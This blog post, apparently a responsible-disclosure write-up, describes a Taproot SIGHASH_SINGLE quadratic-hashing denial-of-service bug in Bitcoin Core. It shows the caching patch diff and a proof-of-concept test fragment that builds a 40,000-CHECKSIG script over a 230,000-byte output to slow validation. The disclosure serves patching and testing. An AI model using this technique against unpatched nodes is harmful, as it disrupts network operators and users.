---
comments: True
disqusId: aa78185d8bdb0035bb9761f38e6c746d80f0e925 
layout: post
title: "Taproot Denial of Service Bug"
date: 2025-03-11
---

TL;DR: Taproot's sighash implementation could cause blocks to take 60s or more to validate with specially crafted standard transactions. The patch adds a new cache during validation.

| | |
| -- | -- |
| patch: | https://github.com/bitcoin/bitcoin/pull/24105 |
| Patched: | 24.x, 23.x. |
| Unpatched: | 22.x |

I discovered this vulnerability while addressing feedback on BIP-119 (CTV) regarding its denial of service risk mitigations.

During the comparison of BIPs' text on DoS mitigations, I identified this vulnerability in the core's Taproot implementation, made a proof of concept exploit, and patched it.

Special thanks to the reviewers and security maintainers of Bitcoin Core for assisting in resolving this issue.


Exploit Explanation & Fix
======

The below code fragment is the core of the fix.

Before the patch, the `sha_single_output` is computed on the fly during script evaluation, potentially. Because it is not cached, it could potentially get re-hashed multiple times.

After the patch, it is cached after the first evaluation (Cache on First Use).

```diff
diff --git a/src/script/interpreter.cpp b/src/script/interpreter.cpp
index 95ffe40a74..07b44971b7 100644
--- a/src/script/interpreter.cpp
+++ b/src/script/interpreter.cpp
@@ -1568,9 +1568,12 @@ bool SignatureHashSchnorr(uint256& hash_out, const ScriptExecutionData& execdata
     // Data about the output (if only one).
     if (output_type == SIGHASH_SINGLE) {
         if (in_pos >= tx_to.vout.size()) return false;
-        CHashWriter sha_single_output(SER_GETHASH, 0);
-        sha_single_output << tx_to.vout[in_pos];
-        ss << sha_single_output.GetSHA256();
+        if (!execdata.m_output_hash) {
+            CHashWriter sha_single_output(SER_GETHASH, 0);
+            sha_single_output << tx_to.vout[in_pos];
+            execdata.m_output_hash = sha_single_output.GetSHA256();
+        }
+        ss << execdata.m_output_hash.value();
     }
```

What could go wrong? Well, suppose I have a transaction that calls CHECKSIG with SIGHASH_SINGLE N times, and the corresponding SIGHASH_SINGLE output is length M. We can trigger `O(M*N)` quadratic hashing.

The below code can be put into the feature_taproot test, along with a few other tweaks, to test this behavior. It makes a script with `40000` CHECKSIGS that each have to hash `230,000` bytes. I think this was the largest size / repetition count I could figure out, and it took about 60s on an M1 Mac to validate.

```python
def spenders_taproot_active():
    """Return a list of Spenders for testing post-Taproot activation behavior."""
    secs = [generate_privkey() for _ in range(8)]
    pubs = [compute_xonly_pubkey(sec)[0] for sec in secs]

    spenders = []
    # Expensive -- Pile up N CHECKSIGs, minding WU for 
    # sigops constraints
    N = 40000
    scripts = [("exp", CScript([b"0"*8, OP_DROP] + [b"0"*13, OP_DROP]*(N-11) + [OP_DUP, pubs[1], OP_CHECKSIGVERIFY]*(N-1) + [pubs[1], OP_CHECKSIG]))]
    tap = taproot_construct(pubs[0], scripts)
    add_spender(spenders, "exp", tap=tap, leaf="exp", standard=False, hashtype=SIGHASH_SINGLE, key=secs[1], **SINGLE_SIG, failure=None)
    return spenders


def big_output(tx):
    # Add 1 Big Output with 0 bytes
    tx.vout.append(CTxOut())
    tx.vout[-1].nValue = in_value
    in_value -= tx.vout[-1].nValue
    tx.vout[-1].scriptPubKey = CScript([b"0"]*230000)
    return tx
    
```

There are variants of this attack that can rely on standard transactions as well, but the caching should eliminate all potential concern with SIGHASH_SINGLE.